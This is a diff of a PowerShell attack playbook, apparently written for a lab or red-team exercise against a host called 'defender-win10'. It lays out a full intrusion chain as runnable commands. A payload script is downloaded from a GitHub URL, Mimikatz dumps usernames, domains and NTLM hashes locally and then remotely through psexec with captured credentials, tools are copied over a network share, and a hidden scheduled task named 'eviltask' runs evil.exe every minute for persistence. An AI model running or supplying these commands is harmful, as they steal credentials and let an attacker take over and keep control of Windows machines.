@@ -1,12 +1,20 @@
 "Inital access"
-
-Set-Execition RemoteSigned
+cd c:\
+mkdir exploit
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/payloads.ps1" -OutFile "payloads.ps1"
+
+"Check output"
+cd c:\exploit\
+get-content computers.txt
+get-content group_domains.txt
+get-content user_group.txt
 
 
 "Run Mimikatz on local PC"
-mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern "\*\s+(Username|Domain|NTLM)\s+: .*" > mimiout.txt
 
+c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern "\*\s+(Username|Domain|NTLM)\s+: .*" > c:\exploit\mimiout.txt
+
+get-content mimiout.txt
 
 "remotly run"
 "Create Share"
@@ -21,12 +29,8 @@ Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c psexec.exe \
 net use z: \\defender-win10\\exploit
 xcopy c:\exploit\mimikatz\ z:\mimikatz\ /E /y
 
-
-
 "Run Mimikatz"
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c c:\exploit\pstools\psexec.exe \\defender-win10 powershell -command `"c:\exploit\mimikatz\x64\mimikatz.exe log privilege::debig sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+:.*' > c:\exploit\mimiout.txt"  -WindowStyle Hidden
-
-
 
 "Creating precistance"
 Start-Process -FilePath cmd.exe -Credential $cred -ArgumentList "/c schtasks /create /sc minute /mo 1 /tn eviltask /tr c:\exploit\evil.exe /ru danny /s defender-win10" -WindowStyle Hidden
